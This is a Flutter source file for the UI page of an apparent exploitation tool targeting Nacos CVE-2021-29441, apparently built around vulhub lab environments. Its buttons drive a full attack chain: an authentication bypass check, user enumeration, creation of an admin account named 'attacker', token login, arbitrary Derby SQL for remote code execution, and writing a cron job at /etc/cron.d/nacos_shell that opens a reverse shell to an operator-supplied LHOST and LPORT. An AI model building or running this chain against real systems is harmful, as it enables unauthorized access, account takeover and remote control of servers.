import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';

class NacosExpPage extends BaseVulhubExpPage {
  const NacosExpPage({super.key});

  @override
  State<NacosExpPage> createState() => _NacosPageState();
}

class _NacosPageState extends BaseVulhubExpPageState<NacosExpPage> {
  @override
  IconData get pageIcon => Icons.cloud;

  @override
  String get appBarTitle => 'Nacos CVE-2021-29441 User-Agent 认证绕过';

  @override
  String get cardTitle => 'Nacos CVE-2021-29441';

  @override
  String get cardSubtitle => 'User-Agent: Nacos-Server 绕过认证，枚举/创建用户（< 1.4.1）';

  final _urlCtrl = TextEditingController();
  final _userCtrl = TextEditingController(text: 'attacker');
  final _passCtrl = TextEditingController(text: 'password123');
  final _timeoutCtrl = TextEditingController();
  final _tokenCtrl = TextEditingController();
  final _sqlCtrl = TextEditingController();
  final _lhostCtrl = TextEditingController();
  final _lportCtrl = TextEditingController(text: '4444');

  NacosExpService _svc() => NacosExpService(
        baseUrl: _urlCtrl.text.trim(),
        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
      );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 CVE-2021-29441 认证绕过...');
    try {
      final r = await _svc().check();
      appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到漏洞');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _listUsers() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 枚举用户列表...');
    try {
      final out = await _svc().listUsers();
      appendLog(out != null && out.isNotEmpty ? '[+] 用户列表:\n$out' : '[-] 未获取到用户列表');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _createUser() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final user = _userCtrl.text.trim();
    final pass = _passCtrl.text.trim();
    if (user.isEmpty || pass.isEmpty) {
      appendLog('[!] 请输入用户名和密码');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 创建用户: $user');
    try {
      final out = await _svc().createUser(user, pass);
      appendLog(out != null ? '[+] 响应: $out' : '[-] 创建失败');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _login() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final user = _userCtrl.text.trim();
    final pass = _passCtrl.text.trim();
    if (user.isEmpty || pass.isEmpty) {
      appendLog('[!] 请输入用户名和密码');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 登录获取 accessToken: $user');
    try {
      final token = await _svc().login(user, pass);
      if (token != null && token.isNotEmpty) {
        _tokenCtrl.text = token;
        appendLog('[+] accessToken: $token');
      } else {
        appendLog('[-] 登录失败，请检查凭据');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _derbyQuery() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final token = _tokenCtrl.text.trim();
    final sql = _sqlCtrl.text.trim();
    if (token.isEmpty) {
      appendLog('[!] 请先登录获取 Token');
      return;
    }
    if (sql.isEmpty) {
      appendLog('[!] 请输入 SQL');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 执行 Derby SQL...');
    try {
      final out = await _svc().derbyQuery(token, sql);
      if (out == null) {
        appendLog('[-] 无响应');
      } else if (out.startsWith('[DERBY_UNAVAILABLE]')) {
        appendLog('[!] $out');
        appendLog('[!] Derby RCE 仅适用于嵌入式 Derby 模式（单机/开发部署）');
      } else {
        appendLog('[+] 响应:\n$out');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _writeCronShell() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final token = _tokenCtrl.text.trim();
    final ip = _lhostCtrl.text.trim();
    final port = _lportCtrl.text.trim();
    if (token.isEmpty) {
      appendLog('[!] 请先登录获取 Token');
      return;
    }
    if (ip.isEmpty || port.isEmpty) {
      appendLog('[!] 请输入 LHOST 和 LPORT');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 写入 /etc/cron.d/nacos_shell → $ip:$port');
    try {
      final out = await _svc().writeCronShell(token, ip, port);
      if (out == null) {
        appendLog('[-] 写入失败，无响应');
      } else if (out.startsWith('[DERBY_UNAVAILABLE]')) {
        appendLog('[!] $out');
        appendLog('[!] Derby RCE 仅适用于嵌入式 Derby 模式（单机/开发部署）');
      } else {
        appendLog('[+] 响应: $out');
        appendLog('[*] 等待约 1 分钟触发 cron');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _userCtrl.dispose();
    _passCtrl.dispose();
    _timeoutCtrl.dispose();
    _tokenCtrl.dispose();
    _sqlCtrl.dispose();
    _lhostCtrl.dispose();
    _lportCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle('目标配置'),
          vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            '超时(s)',
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              vBtn('检测漏洞', running ? null : _check),
              const SizedBox(width: 8),
              vBtn('枚举用户', running ? null : _listUsers),
            ],
          ),
          const SizedBox(height: 16),
          vSecTitle('Step 1 — 创建/使用管理员账号'),
          vTf(_userCtrl, '用户名', 'attacker'),
          const SizedBox(height: 8),
          vTf(_passCtrl, '密码', 'password123'),
          const SizedBox(height: 8),
          Row(
            children: [
              vBtn('创建用户', running ? null : _createUser),
              const SizedBox(width: 8),
              vBtn('登录获取 Token', running ? null : _login),
            ],
          ),
          const SizedBox(height: 16),
          vSecTitle('Step 2 — Derby SQL RCE'),
          vTf(_tokenCtrl, 'accessToken', '登录后自动填入'),
          const SizedBox(height: 8),
          vTf(_sqlCtrl, '任意 Derby SQL', "SELECT * FROM sys.systables"),
          const SizedBox(height: 8),
          vBtn('执行 SQL', running ? null : _derbyQuery),
          const SizedBox(height: 16),
          vSecTitle('Step 3 — Cron 反弹 Shell'),
          vTf(_lhostCtrl, 'LHOST', '192.168.1.1'),
          const SizedBox(height: 8),
          vTf(_lportCtrl, 'LPORT', '4444', type: TextInputType.number),
          const SizedBox(height: 8),
          vBtn('写入 Cron Shell', running ? null : _writeCronShell),
        ],
      ),
    );
  }
}
